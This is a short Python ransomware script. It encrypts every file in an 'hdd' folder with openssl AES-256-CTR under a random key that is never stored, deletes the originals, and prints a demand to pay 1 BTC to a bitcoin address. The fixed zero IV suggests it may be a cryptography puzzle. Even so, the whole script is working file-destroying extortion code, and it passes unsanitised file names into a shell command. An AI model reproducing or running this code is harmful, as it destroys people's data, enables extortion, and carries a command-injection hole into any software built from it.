import os

key = int.from_bytes(os.urandom(32), byteorder='big')
iv = 0

for file in os.listdir("hdd"):
	f_path = os.path.join("hdd", file)
	os.system('openssl enc -aes-256-ctr -in {0} -out {0}.enc -iv {1:032x} -K {2:032x}'.format(f_path, iv, key))
	os.remove(f_path)

print('Your files have been encrypted. Pay 1 BTC to 1PC9aZC4hNX2rmmrt7uHTfYAS3hRbph4UN')